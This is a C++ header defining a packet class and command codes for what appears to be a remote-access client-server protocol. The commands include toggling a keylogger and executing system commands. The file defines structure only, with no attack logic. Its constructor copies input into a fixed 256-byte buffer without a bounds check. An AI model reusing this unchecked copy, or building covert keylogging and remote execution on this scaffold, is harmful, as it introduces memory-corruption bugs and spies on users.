#pragma once

#include <cstdint>
#include <cstring>
#include <unistd.h>
#include <ctime>
#include <iostream>
#include <winsock2.h>
#include <sstream>

class MyPacket
{
public:
  uint8_t command;
  uint8_t status_code;
  uint16_t payload_length;
  uint32_t timestamp;
  uint8_t payload[256];

  MyPacket() {}

  MyPacket(const MyPacket &other)
  {
    command = other.command;
    status_code = other.status_code;
    payload_length = other.payload_length;
    timestamp = other.timestamp;
    memcpy(payload, other.payload, sizeof(other.payload));
  }

  MyPacket(uint8_t cmd, uint8_t status, std::string data)
  {
    command = cmd;
    status_code = status;
    payload_length = htons(data.size());
    timestamp = htonl(time(nullptr));
    memset(payload, 0, sizeof(payload));
    memcpy(payload, data.data(), data.size());
  }

  ~MyPacket() {}

  MyPacket &operator=(const MyPacket &other)
  {
    if (this != &other)
    {
      command = other.command;
      status_code = other.status_code;
      payload_length = other.payload_length;
      timestamp = other.timestamp;
      memcpy(payload, other.payload, sizeof(other.payload));
    }
    return *this;
  }

  std::string toString() const
  {
    std::stringstream ss;

    ss << "\tcommand: " << (int)command 
       << "\n\tstatus: " << (int)status_code 
       << "\n\tlength: " << payload_length 
       << "\n\ttimestamp: " << timestamp 
       << "\n\tpayload: {\n" << payload << "\n}\n" 
       << std::endl;

    return ss.str();
  }
};

enum STATUS_CODE
{
  SUCCESS = 0,
  CMD_NOT_FOUND = 1,
  TIMEOUT = 2,
  SERVER_ERR = 3,
  CLIENT_ERR = 4,
  PENDING = 9
};

enum CMD
{
  GET_INFO = 0x01,
  TOGGLE_KEYLOG = 0x02,
  GET_PROC_LIST = 0x03,
  EXEC_SYS_CMD = 0x04
};

class LPTF_Packet
{
private:
  MyPacket packet;

public:
  // Constructors
  LPTF_Packet();
  LPTF_Packet(const LPTF_Packet &other);
  ~LPTF_Packet();

  // Builders
  unsigned short getCMD();
  unsigned short getStatus();
  unsigned int getPayloadLength(unsigned long &payload);
  static unsigned long getTimestamp();
  unsigned long getPayload();

  static MyPacket getClientData();

  LPTF_Packet &operator=(const LPTF_Packet &other);
};
